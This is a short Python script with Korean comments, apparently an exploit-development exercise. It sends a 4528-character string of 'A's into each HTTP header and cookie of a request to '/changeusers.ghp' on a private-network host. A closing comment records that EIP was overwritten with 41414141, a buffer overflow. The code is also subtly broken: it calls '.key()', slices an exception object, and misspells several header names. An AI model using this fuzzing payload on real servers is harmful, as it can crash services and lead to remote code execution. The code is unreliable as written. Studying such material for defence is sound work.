import requests, copy # copy 라이브러리 (deepcopy -> ptr만 복사 X)

host = "http://172.30.1.8" # 예시
uri = "/changeusers.ghp"

org_headers = {
    "User-Agent" : "Mozilla/4.0",
    "Host" : host.split("://")[1],
    "Acccept" : "text/html ,application/xhtml+xml ,application",
    "Accept-Language" : "en-us",
    "Accept-Encoding" : "gzip, deflate",
    "Referer" : host,
    "Conection" : "Keep-Alive"
}

org_cookies = {
    "SESSIONID" : "6771",
    "UserID" : "id",
    "PassWD" : "password"
}

payload = "A" * 4528 # bug!!! -> A를 4528개 모두 넣어보며 버그 찾기 (원래는 10, 100, 200 ... 모두 넣어봐야 함)

for key in list(org_headers.key()):
    print("Header", key, end=": ") #\n -> :
    try:
        headers = copy.deepcopy(org_headers)
        headers[key] = payload
        res = requests.get(host + uri, headers=headers, cookies=org_cookies)
        print("Good!!")
    except Exception as e:
            print(e[:10])

for key in list(org_cookies.key()):
    print("Cookie", key, end=": ") #\n -> :
    try:
        cookies = copy.deepcopy(org_cookies)
        cookies[key] = payload
        res = requests.get(host + uri, headers=org_headers, cookies=cookies)
        print("Good!!")
    except Exception as e:
            print(e[:10])

# eip(프로그램이 실행할 명렁어 코드) = 41414141(A -> buffer overflow)